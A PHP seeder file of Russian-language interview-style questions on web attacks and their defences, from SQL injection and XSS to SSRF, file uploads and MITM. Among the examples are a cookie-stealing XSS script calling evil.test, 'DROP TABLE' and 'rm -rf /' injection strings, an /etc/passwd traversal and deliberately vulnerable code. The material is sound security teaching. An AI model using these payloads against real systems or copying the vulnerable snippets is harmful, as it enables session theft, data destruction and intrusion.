<?php

namespace Database\Seeders\Data\Categories\Security;

class WebAttacks
{
    public static function all(): array
    {
        return [
            [
                'category' => 'Безопасность',
                'question' => 'Что такое SQL-инъекция простыми словами?',
                'answer' => 'Атакующий через пользовательский ввод вставляет свой SQL-код в твой запрос. Корень проблемы — конкатенация: "SELECT * FROM users WHERE id = " . $_GET[\'id\']. Если в id передать «1 OR 1=1», условие станет всегда истинным и вернётся вся таблица. Введут «1; DROP TABLE users;--» — таблицу удалят. В формах логина классика: «admin\'-- » в поле username отбрасывает проверку пароля. Защита — prepared statements: запрос и данные передаются в БД ОТДЕЛЬНО, БД компилирует шаблон один раз и потом просто подставляет значения как данные, никакой SQL из них не выполнится. В чистом PHP это PDO с ? или :name, в Laravel за тебя это делают Eloquent и query builder (User::where(\'id\', $id)). Опасно ТОЛЬКО там, где ты сам пишешь raw-запрос: DB::raw, whereRaw, selectRaw — там обязательно передавай параметры через bindings, а не через "..".',
                'code_example' => "<?php
// ПЛОХО — конкатенация, классическая SQL-инъекция
\$sql = \"SELECT * FROM users WHERE id = \" . \$_GET['id'];
\$pdo->query(\$sql);
// ввод 1 OR 1=1  → SELECT * FROM users WHERE id = 1 OR 1=1 → вся таблица

// ХОРОШО — prepared statement в PDO
\$stmt = \$pdo->prepare('SELECT * FROM users WHERE id = ?');
\$stmt->execute([\$_GET['id']]);
\$user = \$stmt->fetch();

// В Laravel — Eloquent биндит сам, безопасно
User::where('id', \$request->id)->first();

// Если уж приходится raw — параметризуй через bindings, не \"...\"
DB::select('SELECT * FROM users WHERE email = ?', [\$request->email]);",
                'code_language' => 'php',
                'difficulty' => 1,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое XSS простыми словами?',
                'answer' => 'Cross-Site Scripting — атакующий вставляет свой JavaScript в твой HTML через пользовательский ввод (комментарий, имя профиля, поле поиска), и этот скрипт выполняется в браузере у других посетителей под их сессией. Что он сделает: украдёт куки (если они без HttpOnly) и отправит на свой сервер — дальше входит в аккаунт жертвы; подменит форму платежа; покажет фейковое окно «введите пароль заново». Корень проблемы — вывод пользовательских данных в HTML без экранирования. Защита: htmlspecialchars($s, ENT_QUOTES, \'UTF-8\') в чистом PHP, в Blade — {{ $var }} экранирует автоматически (превращает <script> в &lt;script&gt; — теги становятся текстом). {!! $var !!} в Blade НЕ экранирует — используй только для доверенного HTML (никогда не для пользовательского ввода). Второй рубеж — заголовок CSP, не даст выполниться даже прорвавшемуся скрипту. Куки — обязательно HttpOnly, тогда JS их не прочитает.',
                'code_example' => "<!-- Атакующий сохранил в комментарий: -->
<script>fetch('https://evil.test/steal?c='+document.cookie)</script>

<!-- ПЛОХО — вывели как есть, скрипт выполнится у каждого посетителя -->
<div><?= \$comment ?></div>

<!-- ХОРОШО (чистый PHP) — теги станут текстом -->
<div><?= htmlspecialchars(\$comment, ENT_QUOTES, 'UTF-8') ?></div>
<!-- Получится: <div>&lt;script&gt;fetch(...)&lt;/script&gt;</div> — просто строка -->

<!-- В Blade — экранирование по умолчанию -->
<div>{{ \$comment }}</div>     {{-- безопасно --}}
<div>{!! \$comment !!}</div>   {{-- НЕ экранирует — только для доверенного HTML --}}",
                'code_language' => 'html',
                'difficulty' => 1,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Какие виды XSS бывают?',
                'answer' => 'Три классических вида. 1) Stored (persistent) — вредоносный JS сохраняется на сервере (комментарий, профиль, имя в чате) и при просмотре выполняется у каждого посетителя. Самый опасный, массовый. 2) Reflected — код приходит в URL/параметре и сразу же отражается в ответе сервера. Атака идёт через подложенную ссылку, действует только на тех, кто по ней перешёл. 3) DOM-based — чисто клиентская: JS на странице сам берёт данные из location.hash / window.name и пихает их в innerHTML/eval, сервер вообще не в курсе. Защита одна для всех: экранировать вывод по контексту (htmlspecialchars / {{ }} в Blade), не использовать innerHTML, плюс CSP как второй рубеж.',
                'code_example' => "<!-- Stored: атакующий оставил коммент, сервер сохранил, рендерит всем -->
<div class=\"comment\"><?= \$comment ?></div>

<!-- Reflected: search?q=<script>... -->
<p>Ничего не найдено по запросу: <?= \$_GET['q'] ?></p>

<!-- DOM-based: чисто JS, сервер не видит # -->
<script>
  document.getElementById('hi').innerHTML = location.hash.slice(1);
  // /page#<img src=x onerror=alert(1)>
</script>",
                'code_language' => 'html',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое CSP, какие у него ключевые директивы и режимы?',
                'answer' => 'Content Security Policy — HTTP-заголовок, который указывает браузеру, ОТКУДА можно грузить скрипты/стили/картинки/шрифты/фреймы. Это второй рубеж от XSS: даже если инъекция прошла, неподходящий по политике JS просто не выполнится. Ключевые директивы: default-src — дефолт для всех остальных, script-src / style-src / img-src / connect-src / frame-src / font-src — по типам ресурсов, frame-ancestors — кто может встраивать тебя в iframe (замена X-Frame-Options), report-uri/report-to — куда слать отчёты о нарушениях. Современный подход к inline-скриптам — nonce (одноразовый случайный токен в заголовке + атрибут nonce на <script>) или хеш sha256-... вместо unsafe-inline. strict-dynamic — разрешает скриптам, уже допущенным по nonce/хешу, грузить другие скрипты, и игнорирует whitelist хостов. Режим обкатки: Content-Security-Policy-Report-Only — нарушения только логируются, ничего не блокируется.',
                'code_example' => "# Базовая жёсткая политика c nonce — рекомендация OWASP
Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  style-src 'self' 'nonce-r4nd0m';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  report-to csp-endpoint

# В Blade — генерим nonce на запрос и кладём в каждый <script>
<script nonce=\"{{ \$nonce }}\">/* безопасный inline */</script>",
                'code_language' => 'http',
                'difficulty' => 3,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое CSRF простыми словами?',
                'answer' => 'Cross-Site Request Forgery — атакующий заставляет браузер уже залогиненного пользователя выполнить опасное действие на твоём сайте без его ведома. Поток: жертва зашла к тебе утром и осталась залогинена (кука сессии живёт). Днём открыла сайт атакующего, на странице — скрытая форма с action="https://твой-сайт/account/delete" и автосабмитом через JS. Браузер шлёт POST на твой домен и АВТОМАТИЧЕСКИ прикладывает куку сессии — для сервера это выглядит как обычный запрос от настоящего пользователя, аккаунт удаляется. Защита по двум направлениям: 1) CSRF-токен — случайная строка, которую сервер кладёт в форму скрытым полем и в сессию, а при POST сверяет, что они совпали; чужой сайт не сможет прочитать токен из-за Same-Origin Policy, поэтому атака не пройдёт. 2) Кука с флагом SameSite=Lax/Strict — браузер не пошлёт её на POST с чужого домена. В Laravel оба механизма из коробки: middleware VerifyCsrfToken проверяет токен на всех POST/PUT/DELETE, а @csrf в Blade-форме автоматически вставляет нужный input.',
                'code_example' => "<!-- 1. На сайте атакующего — форма-ловушка, отправляется сама -->
<form action=\"https://your-site.test/account/delete\" method=\"POST\">
  <input name=\"confirm\" value=\"yes\">
</form>
<script>document.forms[0].submit()</script>
<!-- браузер жертвы сам приложит куку сессии your-site.test -->

<!-- 2. Защита в Blade — @csrf разворачивается в hidden-input с токеном -->
<form method=\"POST\" action=\"/account/delete\">
  @csrf
  {{-- <input type=\"hidden\" name=\"_token\" value=\"slu4ajny-token\"> --}}
  <button>Удалить аккаунт</button>
</form>

<!-- 3. Для AJAX — токен из meta в заголовок X-CSRF-TOKEN -->
<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\">
<script>
fetch('/account/delete', {
  method: 'POST',
  headers: { 'X-CSRF-TOKEN': document.querySelector('meta[name=csrf-token]').content }
});
</script>",
                'code_language' => 'html',
                'difficulty' => 1,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое SSRF и как от него защититься?',
                'answer' => 'Server-Side Request Forgery — атакующий заставляет твой сервер послать HTTP-запрос туда, куда ему нужно. Типичный путь — фичи «предпросмотр URL», «импорт по ссылке», webhook callback, аватарка по URL. Подсунули http://localhost:6379/ — твой PHP из доверенной сети дёргает внутренний Redis в обход firewall. Особо опасно в облаках: AWS/GCP metadata-эндпоинт 169.254.169.254 раздаёт IAM-токены инстансу — SSRF превращается в полный доступ к облаку (так взламывали Capital One). Защита в несколько слоёв: 1) Whitelist схем (только http/https) и доменов. 2) Резолвим DNS сами и блочим приватные диапазоны: 127.0.0.0/8, 10.0.0.0/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7. 3) Защита от DNS-rebinding — резолвим один раз, шлём запрос по IP с заголовком Host. 4) Отдельный egress firewall, который вообще не пускает наружу из приложения. 5) Запрет редиректов или повторная проверка на каждом hop. 6) Для AWS — IMDSv2 (требует токена, защищён от SSRF).',
                'code_example' => "<?php
function fetchSafe(string \$url): string {
    \$parts = parse_url(\$url);
    if (!in_array(\$parts['scheme'] ?? '', ['http','https'], true)) abort(400);

    // Резолвим хост и проверяем все A-записи
    \$ips = gethostbynamel(\$parts['host']) ?: abort(400);
    foreach (\$ips as \$ip) {
        if (filter_var(\$ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            abort(400, 'private IP blocked');
        }
    }
    \$res = Http::withOptions(['allow_redirects' => false, 'timeout' => 5])->get(\$url);
    return \$res->body();
}",
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое clickjacking простыми словами?',
                'answer' => 'Атака «UI-redress»: твой сайт встраивается в невидимый/полупрозрачный iframe на сайте атакующего, поверх рисуется заманчивая кнопка «Скачать» / «Ты выиграл». Пользователь залогинен у тебя, кликает на «приз», но клик уходит в скрытую кнопку «Удалить аккаунт» / «Перевести деньги» внутри iframe — действие выполняется от его имени, куки прицепляются автоматически. Защита: запретить обрамление через заголовок X-Frame-Options: DENY (старый, простой) или современный CSP frame-ancestors \'none\' (можно whitelist доменов). Дополнительно — SameSite=Lax у куки сильно ограничивает атаку.',
                'code_example' => "# Запрет встраивания страницы в iframe — два эквивалентных варианта
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

# Разрешить только своему домену:
Content-Security-Policy: frame-ancestors 'self' https://admin.example.com",
                'code_language' => 'http',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое path traversal простыми словами?',
                'answer' => 'Атакующий через user-input в имени файла выходит за пределы разрешённой папки и читает/записывает что попало на диске. Классика: file_get_contents("uploads/" . $_GET[\'file\']) + ввод ../../../etc/passwd → читаем системный файл. Закодированные варианты: %2e%2e%2f, ..%5c, кириллические гомоглифы. Защита: 1) basename() обрезает путь до имени файла. 2) realpath() + проверка, что результат начинается с разрешённой директории. 3) whitelist допустимых имён/расширений. 4) хранение файлов под сгенерированными id, отдача через контроллер.',
                'code_example' => "<?php
\$base = realpath(__DIR__.'/uploads');
\$path = realpath(\$base.'/'.\$_GET['file']);

// realpath() резолвит .. — проверяем, не вылезли ли мы за base
if (\$path === false || !str_starts_with(\$path, \$base.DIRECTORY_SEPARATOR)) {
    http_response_code(403);
    exit('forbidden');
}
readfile(\$path);",
                'code_language' => 'php',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое command injection простыми словами?',
                'answer' => 'Атакующий через пользовательский ввод склеивает свою shell-команду со строкой, которую PHP отдаёт в exec/shell_exec/system/passthru. Пример: shell_exec("ping " . $_GET[\'host\']) + ввод «8.8.8.8; rm -rf /» — оболочка интерпретирует «;» как разделитель и выполняет обе команды. Бэктики (`...`), $(...), |, && — все опасны. Защита: 1) Не вызывать shell вообще, использовать готовые библиотеки PHP. 2) Если shell неизбежен — escapeshellarg() на КАЖДОМ аргументе. 3) Symfony Process с массивом аргументов (без склейки). 4) Whitelist значений (для host — проверка на валидный IP/домен).',
                'code_example' => "<?php
// ПЛОХО — конкатенация уходит в /bin/sh -c
shell_exec('ping -c1 '.\$_GET['host']);

// ХОРОШО (1) — escapeshellarg
\$host = escapeshellarg(\$_GET['host']);
shell_exec(\"ping -c1 {\$host}\");

// ЛУЧШЕ (2) — Symfony Process с массивом, shell не задействован
use Symfony\\Component\\Process\\Process;
\$p = new Process(['ping', '-c1', \$_GET['host']]);
\$p->run();",
                'code_language' => 'php',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое mass assignment в Laravel простыми словами?',
                'answer' => 'Уязвимость, когда фреймворк автоматически проставляет в модель все поля из массива запроса. Атакующий добавляет в форму лишнее скрытое поле — role=admin, is_verified=1, user_id=42 — и через User::create($request->all()) или $user->fill($request->all()) оно сохраняется. Защита в Laravel: явный $fillable (whitelist полей, которые можно массово заполнять) ИЛИ $guarded (blacklist, по умолчанию []). Лучшая практика — FormRequest с validated() и $request->only([...]): сохраняется только то, что прошло валидацию.',
                'code_example' => "<?php
// Модель — whitelist полей
class User extends Model {
    protected \$fillable = ['name', 'email'];
    // 'role', 'is_admin' — НЕ в \$fillable, mass assign их не тронет
}

// Контроллер — пропускаем только провалидированные поля
public function store(StoreUserRequest \$request) {
    User::create(\$request->validated()); // безопасно
    // или явно:
    User::create(\$request->only(['name', 'email']));
}",
                'code_language' => 'php',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое open redirect простыми словами?',
                'answer' => 'Сервер делает редирект на URL из пользовательского параметра без проверки: /login?redirect=https://phishing.example — после логина пользователя выбрасывает на фишинговый сайт, оформленный под твой. Атакующий использует это для фишинга — ссылка идёт с твоего домена, антиспам и юзер ей доверяют, кликают, попадают на клон. Open redirect также — часть chain для OAuth-атак (подмена redirect_uri). Защита: разрешать только относительные пути, валидировать через parse_url + сверку host со списком разрешённых доменов, никогда не доверять «//evil.com» (browser считает это абсолютным URL).',
                'code_example' => "<?php
\$target = \$_GET['redirect'] ?? '/';

// ПЛОХО — атакующий подставит //evil.com или https://evil.com
header('Location: '.\$target);

// ХОРОШО — только относительные пути на нашем сайте
if (!preg_match('#^/[^/\\\\\\\\]#', \$target)) {
    \$target = '/';
}
header('Location: '.\$target);",
                'code_language' => 'php',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Какие риски при загрузке файлов от пользователей и как защититься?',
                'answer' => 'Риски: 1) Заливка .php в публичную папку → RCE при обращении (классика — shell.php.jpg, который nginx с двойным executor отдаёт PHP-FPM). 2) XSS-полезная нагрузка в svg/html/xml (SVG умеет <script>). 3) Подделка Content-Type клиентом — нельзя ему верить. 4) ZIP/PDF/PNG-бомбы (распаковка 4KB → 4GB). 5) Path traversal в имени файла (../../../). 6) Polyglot-файлы (валидный JPEG + валидный PHP одновременно). Защита по слоям: a) Whitelist расширений + проверка реального MIME через finfo_file. b) Генерим новое имя (Str::uuid()) — не доверяем оригиналу. c) Хранение вне webroot или в S3, отдача через подписанный контроллер. d) В nginx/Apache — явный запрет выполнения PHP в папке загрузок (location ~ ^/uploads { ... }). e) Лимит размера на nginx и в PHP. f) Для картинок — ре-кодировать через Intervention Image: «прогон через imagecreatefromjpeg + imagejpeg» уничтожает любую вшитую полезную нагрузку. g) Антивирус (ClamAV) для пользовательских файлов.',
                'code_example' => "<?php
\$request->validate([
    'avatar' => ['required', 'image', 'mimes:jpg,png', 'max:2048'], // KB
]);

\$file = \$request->file('avatar');
\$mime = \$file->getMimeType(); // читает РЕАЛЬНЫЙ MIME через finfo, не Content-Type
if (!in_array(\$mime, ['image/jpeg','image/png'], true)) abort(422);

// Ре-кодируем — убираем любые вшитые скрипты/exif-payloads
\$img = \\Intervention\\Image\\Laravel\\Facades\\Image::read(\$file)->encodeByMediaType('image/jpeg', quality: 85);

// Имя — uuid, расширение фиксированное
\$path = 'avatars/'.\\Str::uuid().'.jpg';
Storage::disk('s3')->put(\$path, (string) \$img, 'private');
return Storage::disk('s3')->temporaryUrl(\$path, now()->addMinutes(10));",
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'security.web_attacks',
            ],
            [
                'category' => 'Безопасность',
                'question' => 'Что такое MITM (Man-in-the-Middle) простыми словами?',
                'answer' => 'Атакующий встаёт между клиентом и сервером и читает или подменяет трафик. Классический сценарий — публичный Wi-Fi с поддельной точкой «Free_Airport_WiFi», провайдер-злоумышленник, корпоративный прокси. По HTTP всё видно в открытом виде — пароли, куки, токены. HTTPS защищает: TLS шифрует трафик, а сертификат, подписанный доверенным CA, подтверждает, что ты говоришь именно с example.com, а не с прокси. Дополнительные меры: HSTS-заголовок (браузер запоминает «к этому домену только по HTTPS», игнорирует http://), Secure-флаг у куки (не уйдёт по HTTP), certificate pinning в мобильных приложениях.',
                'code_example' => "# HSTS — браузер на год запомнит, что example.com только через HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Куки только по HTTPS
Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Lax",
                'code_language' => 'http',
                'difficulty' => 2,
                'topic' => 'security.web_attacks',
            ],
        ];
    }
}
